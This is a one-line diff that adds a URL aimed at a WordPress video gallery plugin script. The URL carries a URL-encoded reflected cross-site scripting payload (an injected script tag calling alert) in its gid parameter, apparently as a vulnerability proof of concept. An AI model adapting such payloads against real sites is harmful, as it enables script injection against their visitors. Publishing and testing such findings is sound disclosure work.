@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/vodpod-video-gallery/vodpod_gallery_thumbs.php?gid=%22%3E%3Cscript%3Ealert(0)%3C/script%3E
